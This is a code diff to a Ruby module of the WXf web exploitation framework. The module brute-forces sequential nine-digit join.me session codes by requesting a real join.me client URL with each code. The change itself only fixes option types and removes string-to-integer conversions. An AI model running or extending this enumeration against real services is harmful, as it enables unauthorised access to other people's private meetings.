@@ -24,9 +24,9 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
       )
       
       init_opts([
-       OptString.new('UA', [true, "Specify a user agent to utilize", "Mozilla"]),
-       OptBool.new('START', [true, "Session to Start with 000000000 - 999999999" , "505607262"]),
-       OptBool.new('LIMIT', [true, "Total attempts to run" , "2"]),
+       OptString.new('UA', [true, "Specify a user agent to utilize", "1"]),
+       OptInteger.new('START', [true, "Session to Start with 000000000 - 999999999" , 505607262]),
+       OptInteger.new('LIMIT', [true, "Total attempts to run" , 2]),
        OptString.new('RURL', [true, "URL", "https://secure.join.me/Client/FlashClient.aspx?flashversion=10.1&code=" ])
       ])
       
@@ -41,8 +41,8 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
     
   i=0
   
-  while i < limit.to_i do
-    code = sprintf("%09d",start.to_i + i)
+  while i < limit do
+    code = sprintf("%09d",start + i)
     puts rurl + code
     res = send_request_cgi({
       'method' => 'GET',
